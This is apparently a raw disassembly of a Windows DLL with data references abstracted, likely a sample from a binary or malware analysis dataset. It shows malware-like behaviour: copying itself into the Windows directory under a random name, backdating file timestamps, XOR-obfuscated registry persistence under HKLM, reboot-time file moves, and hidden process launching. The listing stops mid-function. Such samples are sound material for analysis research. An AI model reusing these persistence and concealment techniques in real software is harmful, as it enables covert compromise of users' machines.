sub_10001064
push ebp
mov ebp esp
push esi
push edi
xor edi edi
add edx 0x2
mov eax [ ebp + 0x8 ]
lea esi [ edi + eax ]
mov al [ esi ]
push 0x7
pop ecx
call sub_10001000
mov [ edx - 0x2 ] al
mov al [ esi ]
push 0x6
pop ecx
call sub_10001000
mov [ edx - 0x1 ] al
mov al [ esi ]
push 0x5
pop ecx
call sub_10001000
mov [ edx ] al
mov al [ esi ]
push 0x4
pop ecx
call sub_10001000
mov [ edx + 0x1 ] al
mov al [ esi ]
push 0x3
pop ecx
call sub_10001000
mov [ edx + 0x2 ] al
mov al [ esi ]
push 0x2
pop ecx
call sub_10001000
mov [ edx + 0x3 ] al
mov al [ esi ]
xor ecx ecx
inc ecx
call sub_10001000
mov [ edx + 0x4 ] al
mov al [ esi ]
xor ecx ecx
call sub_10001000
mov [ edx + 0x5 ] al
inc edi
add edx 0x8
cmp edi 0x8
jl r-xdata
pop edi
pop esi
pop ebp
retn
sub_100010e7
push ebp
mov ebp esp
xor ecx ecx
add eax 0x2
push esi
mov dl [ eax - 0x2 ]
add dl dl
add dl [ eax - 0x1 ]
mov esi [ ebp + 0x8 ]
add dl dl
add dl [ eax ]
add eax 0x8
add dl dl
add dl [ eax - 0x7 ]
add dl dl
add dl [ eax - 0x6 ]
add dl dl
add dl [ eax - 0x5 ]
add dl dl
add dl [ eax - 0x4 ]
add dl dl
add dl [ eax - 0x3 ]
mov [ ecx + esi ] dl
inc ecx
cmp ecx 0x8
jl r-xdata
pop esi
pop ebp
retn
sub_10001127
push ebp
mov ebp esp
push ecx
push ebx
push edi
push [ ebp + 0xc ]
mov edi eax
call [ malloc@IAT ]
cmp [ ebp + 0xc ] 0x0
pop ecx
mov ebx eax
jle r-xdata
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x10 ]
call [ memcpy@IAT ]
push ebx
call [ free@IAT ]
add esp 0x10
pop edi
pop ebx
leave
retn
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esi edi
mov ecx ebx
sub edi ebx
mov [ ebp - 0x4 ] eax
lea eax [ edi + ecx ]
movzx edx [ eax + esi ]
movzx eax [ eax ]
add edx eax
dec edx
neg edx
sbb dl dl
inc dl
mov [ ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
pop esi
sub_10001188
push ebp
mov ebp esp
push esi
push edi
call [ malloc@IAT ]
mov esi eax
xor eax eax
pop ecx
test edi edi
jle r-xdata
push edi
push esi
push [ ebp + 0x10 ]
call [ memcpy@IAT ]
push esi
call [ free@IAT ]
add esp 0x10
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ebp + 0x8 ]
mov cl [ ecx + edx - 0x1 ]
mov [ esi + eax ] cl
inc eax
cmp eax edi
jl r-xdata
sub_100011c9
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ memcpy@IAT ]
push edi
mov [ ebp - 0x24 ] 0x1c
sub [ ebp - 0x24 ] ebx
push [ ebp - 0x24 ]
mov edi ecx
lea eax [ ebx + edi ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call esi
push ebx
lea eax [ ebp - 0x4 ]
sub eax ebx
push edi
push eax
mov [ ebp - 0x28 ] eax
call esi
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
push [ ebp - 0x24 ]
lea eax [ ebx + edi + 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call esi
push ebx
add edi 0x1c
push edi
push [ ebp - 0x28 ]
call esi
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x48
pop edi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn
sub_10001242
push ebp
mov ebp esp
movzx edx [ eax ]
push esi
movzx esi [ eax + 0x5 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x1 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x2 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x3 ]
movzx eax [ eax + 0x4 ]
add eax [ ebp + 0x8 ]
lea edx [ esi + edx * 2 ]
mov al [ eax + edx * 2 ]
xor dl dl
pop esi
cmp al 0x8
jb r-xdata
mov [ ecx ] dl
mov [ ecx ] 0x1
add al 0xf8
jmp r-xdata
mov [ ecx + 0x1 ] dl
mov [ ecx + 0x1 ] 0x1
add al 0xfc
jmp r-xdata
cmp al 0x4
jb r-xdata
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x2 ] 0x1
add al 0xfe
jmp r-xdata
cmp al 0x2
jb r-xdata
mov [ ecx + 0x3 ] al
pop ebp
retn
sub_100012a2
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi edx
push eax
lea edx [ ebp - 0x94 ]
mov [ ebp - 0x12c ] ecx
call sub_10001064
push esi
lea edx [ ebp - 0xf4 ]
call sub_10001064
lea eax [ ebp - 0x94 ]
push eax
push rw-data
push eax
push 0x40
pop edi
call sub_10001188
lea eax [ ebp - 0xf4 ]
push eax
push rw-data
push eax
push 0x38
pop edi
call sub_10001188
mov esi [ memcpy@IAT ]
push 0x20
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
call esi
push 0x20
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call esi
add esp 0x38
mov [ ebp - 0x128 ] rw-data
mov eax [ ebp - 0x128 ]
mov ebx [ eax ]
lea ecx [ ebp - 0xf4 ]
call sub_100011c9
lea eax [ ebp - 0x124 ]
push eax
push rw-data
lea eax [ ebp - 0xf4 ]
push eax
push 0x30
pop edi
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push rw-data
push eax
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0x124 ]
call sub_10001127
lea ecx [ ebp - 0x34 ]
push rw-data
mov eax ecx
call sub_10001242
push rw-data
lea ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2e ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x22 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x16 ]
call sub_10001242
push rw-data
lea ecx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_10001242
add esp 0x40
push rw-data
lea ecx [ ebp - 0x18 ]
lea eax [ ebp - 0xa ]
call sub_10001242
lea eax [ ebp - 0x34 ]
push eax
push rw-data
push eax
push 0x20
pop edi
call sub_10001188
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0xb4 ]
call sub_10001127
push edi
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
call esi
push edi
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call esi
add [ ebp - 0x128 ] 0x4
add esp 0x34
cmp [ ebp - 0x128 ] rw-data
jl r-xdata
push edi
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
call esi
push edi
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call esi
lea eax [ ebp - 0x94 ]
push eax
push rw-data
push eax
push 0x40
pop edi
call sub_10001188
push [ ebp - 0x12c ]
lea eax [ ebp - 0x94 ]
call sub_100010e7
mov ecx [ ebp - 0x4 ]
add esp 0x28
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
sub_100014b3
push ebp
mov ebp esp
sub esp 0x234
push ebx
push esi
push edi
push 0x3
pop edi
lea esi [ ebp - 0xe ]
mov [ ebp - 0xd ] 0x0
sub esi edi
push r--data
call [ strlen@IAT ]
pop ecx
mov ebx eax
call [ rand@IAT ]
xor edx edx
div ebx
mov al [ edx + r--data ]
mov [ esi + edi ] al
dec edi
jne r-xdata
push 0x10
lea eax [ ebp - 0x24 ]
push edi
push eax
mov [ ebp - 0xd ] 0x0
call [ memset@IAT ]
add esp 0xc
push 0x8
lea eax [ ebp - 0x24 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
push edi
push 0x1
call [ MultiByteToWideChar@IAT ]
push 0xff
lea eax [ ebp - 0x234 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
mov esi [ wcscat@IAT ]
lea eax [ ebp - 0x234 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x234 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x234 ]
push eax
call esi
mov ebx r--data
lea eax [ ebp - 0x234 ]
push ebx
push eax
call esi
mov edi [ wcscpy@IAT ]
lea eax [ ebp - 0x234 ]
push eax
push [ ebp + 0xc ]
call edi
add esp 0x28
push 0x0
lea eax [ ebp - 0x234 ]
push eax
push rw-data
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
call [ GetSystemTime@IAT ]
mov eax 0x7d6
mov [ ebp - 0x34 ] ax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call [ SystemTimeToFileTime@IAT ]
xor eax eax
push eax
push 0x80
push 0x3
push eax
push eax
push __dos_header
lea eax [ ebp - 0x234 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
xor al al
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call edi
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call esi
push ebx
push [ ebp + 0x8 ]
call esi
add esp 0x18
mov al 0x1
lea ecx [ ebp - 0x8 ]
push ecx
push ecx
push ecx
push eax
call [ SetFileTime@IAT ]
push [ ebp - 0x14 ]
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000161f
push ebp
mov ebp esp
sub esp 0x618
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
xor ebx ebx
push r--data
push 0x80000002
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop ebx
leave
retn
push esi
mov esi 0x400
push esi
lea eax [ ebp - 0x618 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x618 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] esi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x18 ] 0x7
jne r-xdata
mov eax [ ebp - 0x14 ]
lea esi [ ebp - 0x618 ]
lea ecx [ ebp + eax - 0x618 ]
mov edx esi
mov edi r--data
cmp edx ecx
jae r-xdata
lea esi [ ebp + eax - 0x619 ]
push edi
push esi
call [ strcpy@IAT ]
push esi
call [ strlen@IAT ]
mov ecx [ ebp - 0x14 ]
lea eax [ ecx + eax + 0x1 ]
push esi
mov [ ebp - 0x14 ] eax
call [ strlen@IAT ]
add esp 0x10
mov [ esi + eax ] bx
push edi
push esi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
push 0x1fe
lea eax [ ebp - 0x218 ]
push ebx
push eax
call [ memset@IAT ]
lea eax [ ebp - 0x218 ]
push r--data
push eax
call [ wcscpy@IAT ]
mov esi [ wcslen@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call esi
mov ecx 0xff
sub ecx eax
add esp 0x18
push ecx
lea eax [ ebp - 0x218 ]
push eax
call esi
pop ecx
lea eax [ ebp + eax * 2 - 0x218 ]
push eax
push 0xffffffff
push edi
push ebx
push 0x1
call [ MultiByteToWideChar@IAT ]
mov edi [ RegOpenKeyW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
push 0x80000002
call edi
cmp eax ebx
jne r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x618 ]
push eax
push 0x7
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
push esi
call [ strlen@IAT ]
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x14 ]
pop ecx
lea ecx [ ebp + eax - 0x618 ]
cmp esi ecx
jb r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ RegSetValueExA@IAT ]
push 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push ebx
push r--data
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] 0x2
call edi
push r--data
call [ strlen@IAT ]
pop ecx
inc eax
push eax
push r--data
push 0x1
push ebx
push r--data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
call sub_1000d02d
test eax eax
je r-xdata
call sub_10004af3
and eax 0xffff0000
cmp eax 0x6000000
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
push 0x80000002
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
push [ ebp - 0x4 ]
call [ RegCreateKeyA@IAT ]
push [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push ebx
push r--data
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ebx
call edi
lea eax [ ebp - 0xc ]
push eax
push r--data
push [ ebp - 0x4 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
mov eax 0x1fe
push eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x218 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0xc ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov edi [ RegSetValueExA@IAT ]
push 0x40
push r--data
push 0x2
push ebx
push r--data
push [ ebp - 0xc ]
call [ RegSetValueExW@IAT ]
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
push 0x1fe
lea eax [ ebp - 0x218 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
xor eax eax
push ebx
push ebx
push ebx
push ebx
push r--data
push [ ebp - 0xc ]
mov [ ebp - 0x1c ] ax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
mov ecx 0x8c
xor [ ebp + eax * 2 - 0x218 ] cx
inc eax
cmp eax 0x10
jl r-xdata
push 0x20
push [ ebp + 0x8 ]
call esi
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
push [ ebp + 0x8 ]
push 0x2
push ebx
push r--data
push [ ebp - 0xc ]
call [ RegSetValueExW@IAT ]
push [ ebp - 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
mov [ ebp - 0x18 ] eax
cmp eax ebx
jle r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
push [ ebp - 0x10 ]
jmp r-xdata
mov eax 0x8c
xor [ ebp + ecx * 2 - 0x218 ] ax
inc ecx
cmp ecx [ ebp - 0x18 ]
jl r-xdata
lea eax [ ebp - 0x218 ]
push eax
push 0x3
push ebx
push r--data
push [ ebp - 0xc ]
call edi
sub_100019b3
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
xor esi esi
call sub_100014b3
pop ecx
pop ecx
test al al
je r-xdata
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0x200 ]
push eax
call sub_1000161f
lea eax [ ebp - 0x400 ]
push eax
call sub_10001bd0
pop ecx
pop ecx
mov esi eax
sub_100019f9
push ebp
mov ebp esp
sub esp 0x504
push edi
lea eax [ ebp - 0x504 ]
push eax
lea eax [ ebp - 0x304 ]
push eax
xor edi edi
call sub_100014b3
pop ecx
pop ecx
test al al
je r-xdata
mov eax edi
pop edi
leave
retn
push esi
lea eax [ ebp - 0x104 ]
push r--data
push eax
call [ wcscpy@IAT ]
mov esi [ wcscat@IAT ]
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
pop esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x304 ]
push eax
call [ wcslen@IAT ]
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
lea eax [ ebp - 0x304 ]
push eax
push 0x2
push edi
push r--data
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push 0x4
push edi
push rw-data
call [ MoveFileExW@IAT ]
lea eax [ ebp - 0x504 ]
push eax
call [ LoadLibraryW@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
call eax
inc edi
sub_10001ae7
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x108 ]
push r--data
push eax
xor ebx ebx
call [ strcpy@IAT ]
mov esi [ strcat@IAT ]
lea eax [ ebp - 0x108 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x108 ]
push r--data
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
push 0x4
push 0x0
push rw-data
call [ MoveFileExW@IAT ]
pop esi
mov eax ebx
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
mov esi r--data
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0xff
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x8 ]
shr ecx 0x1
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x108 ]
push eax
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
test eax eax
jne r-xdata
mov edx 0x8c
xor [ ebp + eax * 2 - 0x108 ] dx
inc eax
cmp eax ecx
jb r-xdata
push esi
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
xor ebx ebx
inc ebx
sub_10001bd0
push ebp
mov ebp esp
sub esp 0x25c
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x25c ]
push r--data
push 0x104
push eax
call [ _snwprintf@IAT ]
mov esi [ memset@IAT ]
push 0x10
xor edi edi
lea eax [ ebp - 0x10 ]
push edi
push eax
call esi
push 0x44
lea eax [ ebp - 0x54 ]
push edi
push eax
call esi
add esp 0x28
xor eax eax
mov [ ebp - 0x24 ] ax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push edi
push edi
push 0x8000000
push edi
push edi
push edi
lea eax [ ebp - 0x25c ]
push eax
push edi
mov [ ebp - 0x54 ] 0x44
mov [ ebp - 0x28 ] 0x1
call [ CreateProcessW@IAT ]
pop edi
pop esi
leave
retn
sub_10001c4a
test edx edx
je r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_10001c7b
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push ebx
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebx ebx
push ebx
push [ ebp + 0x8 ]
lea eax [ eax + esi + 0x18 ]
push eax
call [ memcpy@IAT ]
lea eax [ esi + 0x18 ]
push eax
mov ecx esi
call sub_10001d16
lea eax [ ebx + 0x3f ]
add esp 0x10
cmp eax edi
jae r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
sub edi ebx
add ebx [ ebp + 0x8 ]
push edi
lea eax [ eax + esi + 0x18 ]
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
lea eax [ eax + ecx - 0x3f ]
push eax
mov ecx esi
call sub_10001d16
add [ ebp - 0x4 ] 0x40
add ebx 0x40
pop ecx
cmp [ ebp - 0x4 ] edi
jb r-xdata
sub_10001d16
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x10
mov [ ebp - 0x4c ] ecx
add eax 0x2
lea edx [ ebp - 0x44 ]
pop esi
movzx edi [ eax + 0x1 ]
movzx ebx [ eax ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add eax 0x4
dec esi
jne r-xdata
mov edi [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
mov ebx esi
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x44 ]
mov ebx edi
add eax [ ecx ]
rol eax 0x3
and ebx eax
mov ecx eax
not ecx
and ecx esi
or ecx ebx
add ecx [ ebp - 0x40 ]
add ecx edx
rol ecx 0x7
mov edx ecx
not edx
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x3c ]
mov ebx ecx
add edx esi
rol edx 0xb
and ebx edx
mov esi edx
not esi
and esi eax
or esi ebx
add esi [ ebp - 0x38 ]
mov ebx edx
add esi edi
ror esi 0xd
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx esi
add edi eax
rol edi 0x3
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x30 ]
add eax ecx
rol eax 0x7
mov ecx eax
not ecx
and ecx esi
mov ebx eax
and ebx edi
or ecx ebx
add ecx [ ebp - 0x2c ]
mov ebx eax
add ecx edx
rol ecx 0xb
mov edx ecx
not edx
and edx edi
and ebx ecx
or edx ebx
add edx [ ebp - 0x28 ]
mov ebx ecx
add edx esi
ror edx 0xd
mov esi edx
not esi
and esi eax
and ebx edx
or esi ebx
add esi [ ebp - 0x24 ]
mov ebx edx
add esi edi
rol esi 0x3
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x20 ]
add edi eax
rol edi 0x7
mov ebx edi
mov eax edi
and eax esi
not ebx
and ebx edx
or ebx eax
add ebx [ ebp - 0x1c ]
add ebx ecx
rol ebx 0xb
mov ecx edi
and ecx ebx
mov eax ebx
not eax
and eax esi
or eax ecx
add eax [ ebp - 0x18 ]
add eax edx
ror eax 0xd
mov ecx eax
not ecx
and ecx edi
mov edx ebx
and edx eax
or ecx edx
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x48 ] eax
add ecx esi
rol ecx 0x3
and eax ecx
mov edx ecx
not edx
and edx ebx
or edx eax
add edx [ ebp - 0x10 ]
add edx edi
rol edx 0x7
mov eax edx
not eax
and eax [ ebp - 0x48 ]
mov esi edx
and esi ecx
or eax esi
add eax [ ebp - 0xc ]
mov edi edx
add eax ebx
rol eax 0xb
and edi eax
mov esi eax
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x8 ]
mov edi eax
add esi [ ebp - 0x48 ]
ror esi 0xd
or edi esi
mov [ ebp - 0x48 ] esi
and edi edx
mov esi eax
and esi [ ebp - 0x48 ]
or edi esi
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx + 0x5a827999 ]
mov edi [ ebp - 0x48 ]
rol ecx 0x3
mov esi edi
or esi ecx
and edi ecx
mov ebx esi
and ebx eax
or ebx edi
add ebx [ ebp - 0x34 ]
lea edx [ ebx + edx + 0x5a827999 ]
rol edx 0x5
and esi edx
or esi edi
add esi [ ebp - 0x24 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edx
mov edi eax
and edi ecx
or esi edi
add esi [ ebp - 0x14 ]
mov edi [ ebp - 0x48 ]
lea esi [ esi + edi + 0x5a827999 ]
rol esi 0xd
mov edi eax
or edi esi
and edi edx
mov ebx eax
and ebx esi
or edi ebx
add edi [ ebp - 0x40 ]
mov [ ebp - 0x48 ] esi
lea ecx [ edi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov edi [ ebp - 0x48 ]
mov ebx esi
and ebx ecx
and edi eax
or edi ebx
add edi [ ebp - 0x30 ]
lea edi [ edi + edx + 0x5a827999 ]
mov edx [ ebp - 0x48 ]
rol edi 0x5
and edx edi
or edx ebx
add edx [ ebp - 0x20 ]
lea eax [ edx + eax + 0x5a827999 ]
rol eax 0x9
mov edx eax
or edx ecx
and edx edi
mov ebx eax
and ebx ecx
or edx ebx
add edx [ ebp - 0x10 ]
mov ebx eax
lea edx [ edx + esi + 0x5a827999 ]
rol edx 0xd
mov esi eax
or esi edx
and esi edi
and ebx edx
or esi ebx
add esi [ ebp - 0x3c ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x2c ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x1c ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx eax
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
and ebx edx
mov esi eax
or esi edx
and esi edi
or esi ebx
add esi [ ebp - 0x38 ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x28 ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x18 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0x8 ]
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
mov esi edi
xor esi eax
xor esi edx
add esi [ ebp - 0x44 ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x24 ]
lea edi [ esi + edi + 0x6ed9eba1 ]
rol edi 0x9
mov esi edi
xor esi edx
xor esi ecx
add esi [ ebp - 0x34 ]
lea eax [ esi + eax + 0x6ed9eba1 ]
rol eax 0xb
mov esi edi
xor esi eax
mov ebx esi
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
rol edx 0xf
xor esi edx
add esi [ ebp - 0x3c ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x1c ]
lea esi [ esi + edi + 0x6ed9eba1 ]
rol esi 0x9
mov edi esi
xor edi edx
xor edi ecx
add edi [ ebp - 0x2c ]
lea edi [ edi + eax + 0x6ed9eba1 ]
rol edi 0xb
mov ebx esi
xor ebx edi
mov eax ebx
xor eax ecx
add eax [ ebp - 0xc ]
push 0x40
lea eax [ eax + edx + 0x6ed9eba1 ]
rol eax 0xf
xor ebx eax
add ebx [ ebp - 0x40 ]
mov edx edi
xor edx eax
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor edx ecx
add edx [ ebp - 0x20 ]
push 0x0
